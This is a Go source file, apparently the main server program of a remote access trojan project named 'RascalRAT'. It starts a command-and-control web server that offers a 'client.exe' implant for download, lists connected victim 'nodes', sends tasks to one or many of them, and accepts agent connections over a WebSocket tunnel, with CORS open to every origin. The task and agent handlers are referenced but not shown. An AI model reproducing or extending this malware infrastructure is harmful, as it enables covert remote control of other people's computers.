package main

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/its-ernest/RascalRAT/internal/ws"
	"github.com/its-ernest/RascalRAT/pkg/server"

	"log/slog"

	"github.com/joho/godotenv"
	"github.com/labstack/echo/v5"
	"github.com/labstack/echo/v5/middleware"
)

func main() {
	godotenv.Load(".env")

	if err := server.ReadAndPrintFile("doom.txt", "cyan"); err != nil {
		fmt.Println("Error:", err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	slog.SetDefault(logger)

	e := echo.New()
	e.Use(middleware.RequestLogger())
	e.Use(middleware.Recover())

	// Allow browser control scripts running on localhost to send requests
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
		AllowMethods: []string{http.MethodGet, http.MethodPost},
	}))

	hub := ws.NewHub()

	initAuthRoutes(e)
	applyAuthMiddleware(e)

	// Operational REST Endpoints
	e.GET("/assets/*file", echo.WrapHandler(http.StripPrefix("/assets/", http.FileServer(http.Dir("public")))))
	e.GET("/", func(c *echo.Context) error {
		return c.File("public/index.html")
	})
	e.GET("/status", handleStatus)

	// Build endpoints removed - client is built during docker build when BUILD_CLIENT=1

	e.GET("/build_status", func(c *echo.Context) error {
		resp := map[string]string{
			"status": "idle",
			"error":  "",
			"output": "Build endpoints removed. Client is built during docker build when BUILD_CLIENT=1.",
		}
		return c.JSON(http.StatusOK, resp)
	})

	e.GET("/download_client", func(c *echo.Context) error {
		artifact := filepath.Join("bin", "client.exe")

		if _, err := os.Stat(artifact); os.IsNotExist(err) {
			return c.JSON(http.StatusNotFound, map[string]string{"error": "Client binary not found. Build the Docker image with BUILD_CLIENT=1 to include client.exe."})
		}

		return c.Attachment(artifact, "client.exe")
	})

	// Node Management and Task Execution Endpoints
	e.GET("/nodes", func(c *echo.Context) error {
		return handleListNodes(c, hub)
	})
	e.POST("/nodes/task", func(c *echo.Context) error {
		return handleDispatchTaskMulti(c, hub)
	})
	e.POST("/nodes/:id/task", func(c *echo.Context) error {
		return handleDispatchTask(c, hub)
	})

	// The Single WebSocket tracking tunnel endpoint
	e.GET("/ws/connect", func(c *echo.Context) error {
		return handleAgentWebSocket(c, hub)
	})

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	addr := os.Getenv("PORT")
	if addr == "" {
		addr = ":8182"
	} else if !strings.HasPrefix(addr, ":") {
		addr = ":" + addr
	}

	sc := echo.StartConfig{
		Address:         addr,
		GracefulTimeout: 10 * time.Second,
	}

	slog.Info("starting high-performance administration console", "port", sc.Address)

	if err := sc.Start(ctx, e); err != nil && !errors.Is(err, http.ErrServerClosed) {
		slog.Error("server boot failure", "err", err)
	}

	hub.CloseAll("server shutdown")
	slog.Info("management api gracefully exited.")
}

func handleStatus(c *echo.Context) error {
	return c.JSON(http.StatusOK, map[string]string{"status": "operational"})
}
